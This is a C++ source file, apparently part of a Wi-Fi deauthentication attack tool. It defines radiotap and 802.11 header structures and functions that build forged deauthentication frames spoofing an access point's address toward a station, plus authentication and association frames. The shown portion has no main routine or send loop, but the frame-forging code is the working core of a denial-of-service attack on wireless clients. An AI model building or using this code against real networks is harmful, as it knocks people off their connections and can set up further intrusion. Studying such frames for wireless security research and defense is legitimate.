#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include "mac.h"
#include "dot11hdr.h"

void usage();

Mac ap_mac;
Mac station_mac;
bool flag = false;

struct deauthPacketset {
    uint8_t ver: 2;
    uint8_t type: 2;
    uint8_t subtype: 4;
    uint8_t flags;
    uint16_t duration;

    uint8_t typeSubtype() {
        return type << 4 | subtype;
    }

    // type
    enum: uint8_t {
        Manage = 0,
            Control = 1,
            Data = 2
    };

    // typeSubtype
    enum: uint8_t {
        Beacon = 0x08,
            QosNull = 0x2C,
            Acknowledgement = 0x1D
    };
};

struct BeaconHeader: deauthPacketset {
    Mac dest_addr;
    Mac src_addr;
    Mac bssid;
    uint8_t frag: 4;
    uint16_t seq: 12;
    uint16_t fix;

    Mac ra() {
        return dest_addr;
    }
    Mac da() {
        return dest_addr;
    }
    Mac ta() {
        return src_addr;
    }
    Mac sa() {
        return src_addr;
    }
    Mac ba() {
        return bssid;
    }
};

struct RadiotapHeader {
    u_int8_t it_version; /* set to 0 */
    u_int8_t it_pad;
    u_int16_t it_len; /* entire length */
    u_int32_t it_present; /* fields present */
    u_int8_t datarate;
    u_int8_t unknown;
    u_int16_t txflag;
};

struct RadiotapHeader2 final {
    u_int8_t version_;
    u_int8_t pad_;
    u_int16_t it_len;
    u_int32_t pre1_;
    u_int32_t pre2_;
    u_int8_t flag_;
    u_int8_t data_rate_;
    u_int16_t channel_freq_;
    u_int16_t channel_flags_;
    u_int8_t antenna_sig_;
    u_int8_t zero_;
    u_int16_t rx_flag_;
    u_int8_t antenna_;
    u_int8_t zero_2_;

    enum PRESENT_1 {
        TIMESTAMP = 0x1,
            FLAGS = 0x2,
            RATE = 0x4,
            CHANNEL = 0x8,
            FHSS = 0x10,
            DBM_ANTENNA_SIGNAL = 0x20,
            DBM_ANTENNA_NOISE = 0x40,
            LOCK_QUALITY = 0x80,
            TX_ATTENUATION = 0x100,
            DB_TX_ATTENUATION = 0x200,
            DBM_TX_POWER = 0x400,
            ANTENNA = 0x800,
            DB_ANTENNA_SIGNAL = 0x1000,
            DB_ANTENNA_NOISE = 0x2000,
            RX_FLAGS = 0x4000,
            TX_FLAGS = 0x8000,
            RTS_RETRIES = 0x10000,
            DATA_RETRIES = 0x20000,
    };
    enum PRESENT_2 {
        EXT = 0x80000000,
    };

};

struct DeauthPacket final {
    RadiotapHeader radio_;
    BeaconHeader beacon_;
};

struct AuthPacket final {
    RadiotapHeader2 radio_;
    Dot11Hdr dot11_;
    u_int16_t auth_algo_;
    u_int16_t auth_seq_;
    u_int16_t status_code_;
};

struct AssociationPacket final {
    RadiotapHeader radio_;
    Dot11Hdr dot11_;
    u_int16_t capa_;
    u_int16_t listen_;
};

DeauthPacket makeDeauthPacket(Mac apMac, Mac stationMac) {
    DeauthPacket pkt;
    pkt.radio_.it_version = 0x00;
    pkt.radio_.it_pad = 0x00;
    pkt.radio_.it_len = 0x0c;
    pkt.radio_.it_present = 0x00008004;
    pkt.radio_.datarate = 0x02;
    pkt.radio_.unknown = 0x00;
    pkt.radio_.txflag = 0x0018;
    pkt.beacon_.ver = 0;
    pkt.beacon_.type = 0;
    pkt.beacon_.subtype = 0xc;
    pkt.beacon_.flags = 0;
    pkt.beacon_.duration = 0x013a;
    pkt.beacon_.dest_addr = stationMac;
    pkt.beacon_.src_addr = apMac;
    pkt.beacon_.bssid = apMac;
    pkt.beacon_.frag = 0;
    pkt.beacon_.seq = 0;
    pkt.beacon_.fix = 7;
    return pkt;
}

AuthPacket makeAuthPacket(Mac apMac, Mac stationMac) {
    AuthPacket authpacket;
    authpacket.radio_.it_len = 24;
    authpacket.radio_.pre1_ = 0xa000402e;
    authpacket.radio_.pre2_ = 0x00000820;
    authpacket.dot11_.frame_control_ = 0;
    authpacket.dot11_.frame_control_ |= 11 << 4;
    authpacket.dot11_.duration_ = 0x013a;
    authpacket.dot11_.dest_addr = apMac;
    authpacket.dot11_.src_addr = stationMac;
    authpacket.dot11_.bssid = apMac;
    authpacket.dot11_.seq_ctrl_ = 0x0000;
    authpacket.auth_algo_ = 0x0000;
    authpacket.auth_seq_ = 0x0001;
    authpacket.status_code_ = 0x0000;

    return authpacket;
}

AssociationPacket makeAssociationPacket(Mac apMac, Mac stationMac) {
    AssociationPacket associationpacket;
    associationpacket.radio_.it_len = sizeof(RadiotapHeader);
    associationpacket.dot11_.frame_control_ = 0;
    associationpacket.dot11_.duration_ = 0x013a;
    associationpacket.dot11_.dest_addr = apMac;
    associationpacket.dot11_.src_addr = stationMac;
    associationpacket.dot11_.bssid = apMac;
    associationpacket.dot11_.seq_ctrl_ = 0x0000;
    associationpacket.capa_ = 0x0431;
    associationpacket.listen_ = 0x000a;
    return associationpacket;
}